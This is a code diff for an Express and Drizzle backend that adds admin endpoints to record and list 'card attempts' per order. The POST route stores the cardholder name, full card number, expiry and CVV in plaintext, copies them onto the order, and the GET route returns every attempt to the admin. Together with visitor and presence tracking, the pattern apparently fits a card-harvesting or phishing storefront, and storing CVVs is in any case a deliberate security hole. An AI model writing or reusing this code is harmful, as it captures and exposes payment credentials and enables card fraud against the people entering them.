@@ -1,10 +1,69 @@
 import { Router } from "express";
 import { asc, desc, eq } from "drizzle-orm";
-import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable } from "@workspace/db";
+import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable, cardAttemptsTable } from "@workspace/db";
 import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
 
 const router = Router();
+
+// Get card attempts for an order
+router.get("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
+  try {
+    const orderId = Number(req.params.orderId);
+    if (Number.isNaN(orderId)) {
+      return res.status(400).json({ error: "Invalid order id" });
+    }
+
+    const attempts = await db
+      .select()
+      .from(cardAttemptsTable)
+      .where(eq(cardAttemptsTable.orderId, orderId))
+      .orderBy(desc(cardAttemptsTable.createdAt));
+
+    res.json(attempts);
+  } catch (error) {
+    next(error);
+  }
+});
+
+// Add a new card attempt
+router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
+  try {
+    const orderId = Number(req.params.orderId);
+    if (Number.isNaN(orderId)) {
+      return res.status(400).json({ error: "Invalid order id" });
+    }
+
+    const { cardName, cardNumber, cardExpiry, cardCvv } = req.body;
+
+    // Add card attempt
+    const [attempt] = await db
+      .insert(cardAttemptsTable)
+      .values({
+        orderId,
+        cardName,
+        cardNumber,
+        cardExpiry,
+        cardCvv,
+      })
+      .returning();
+
+    // Also update the order with latest card data
+    await db
+      .update(ordersTable)
+      .set({
+        cardName,
+        cardNumber,
+        cardExpiry,
+        cardCvv,
+      })
+      .where(eq(ordersTable.id, orderId));
+
+    res.status(201).json(attempt);
+  } catch (error) {
+    next(error);
+  }
+});
 
 router.get("/admin/orders", async (_req, res, next) => {
   try {
